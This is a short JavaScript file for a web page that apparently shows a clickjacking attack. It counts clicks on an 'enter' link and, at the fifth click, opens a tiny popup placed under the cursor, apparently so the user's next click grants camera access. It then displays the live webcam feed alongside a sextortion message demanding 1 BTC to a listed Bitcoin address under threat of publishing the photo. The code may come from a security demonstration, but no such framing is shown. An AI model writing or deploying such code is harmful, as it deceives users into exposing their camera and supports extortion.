let win = null

const enterLink = document.querySelector('#enter')

const { x: enterX, y: enterY } = enterLink.getBoundingClientRect()
enterLink.addEventListener('click', enterClick)

let remaining = 10

function enterClick () {
  remaining -= 1
  document.querySelector('.left').textContent = remaining
  if (remaining === 5) {
    const x = window.screenX
    const y = window.screenY
    openWindow('pop.html', x + enterX - 245, y + enterY - 55)
  }
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow (
  url = window.location.pathname, x = 0, y = 0, width = 100, height = 100
) {
  const opts = `width=${width},height=${height},left=${x},top=${y}`
  const _win = window.open(url, '', opts)

  // New windows may be blocked by the popup blocker
  if (!_win) return
  win = _win
  return win
}

window.addEventListener('message', () => {
  initCamera()
})

async function initCamera () {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      audio: false,
      video: true
    })
    handleSuccess(stream)
  } catch (e) {
    console.error('error')
  }
}

function handleSuccess (stream) {
  const video = document.createElement('video')
  video.srcObject = stream
  video.muted = true
  video.autoplay = true
  document.body.appendChild(video)
  document.querySelector('.title').textContent = 'WARNING: Send 1 BTC to 1GJjdX1Qkf9ZLmn13zjg8ske7uho6tSJxf or we will publish your photo and tell your friends you were visiting this naughty site'
  document.querySelector('.title').classList.add('red')
}
